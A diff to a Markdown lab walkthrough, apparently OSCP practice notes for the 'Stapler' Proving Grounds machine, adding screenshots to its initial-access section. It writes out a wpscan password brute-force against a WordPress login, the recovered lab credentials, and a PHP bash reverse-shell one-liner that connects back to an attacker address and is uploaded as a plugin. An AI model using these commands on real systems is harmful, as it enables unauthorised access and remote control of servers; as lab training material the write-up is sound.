@@ -195,21 +195,31 @@ OS and Service detection performed. Please report any incorrect results at https
 
 After a lot of searching, I find that 12380 port is also running https service.
 
-![image]()
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h17m23s_001.png)
 
 We find the robots.txt file through ferooxbuster.
 
-![image]()
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h20m17s_002.png)
 
 Browsing to the ```https://192.168.172.148:12380/blogblog/``` we find in robots.txt. The website is built using WordPress.
 
-![image]()
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h20m42s_003.png)
 
-I notice that the name of the commenter is similar to the note file downloaded from ftp, so I try to use brute-force attack to get the WordPress login password.
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h20m58s_004.png)
+
+I notice that the name of the commenter ```john``` is similar to the note file downloaded from ftp, so I try to use brute-force attack to get the WordPress login password.
 
 ```
 wpscan --url https://192.168.172.148:12380/blogblog/ --passwords ~/Documents/rockyou.txt --max-threads 50 --usernames john --disable-tls-checks
 ```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h21m18s_005.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_21h22m48s_006.png)
+
+We confirm that the username is ```john``` and the password is ```incorrect```.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h10m34s_007.png)
 
 Logging in to WordPress admin interface. I find out that we have permission to upload plugin files.
 
@@ -219,12 +229,30 @@ Creating a reverse shell php file.
 echo '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/192.168.49.172/80 0>&1'\''");?>' > shell.php
 ```
 
-![image]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h11m11s_008.png)
 
 Uploading shell.php file to server. 
 
-![image]
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h15m35s_009.png)
 
-Browsing to plugin url ```https://192.168.172.148:12380/blogblog/wp-content/uploads/shell.php``` and we get shell.
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h15m57s_010.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h16m40s_011.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h17m41s_012.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h18m12s_013.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h33m26s_014.png)
+
+Starting a listener on port 80.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h33m55s_015.png)
+
+Browsing to plugin url ```https://192.168.172.148:12380/blogblog/wp-content/uploads/shell.php``` and then we get the shell.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h35m47s_016.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Stapler/Stapler_2022.02.24_22h36m5s_017.png)
 
 #### Privilege Escalation
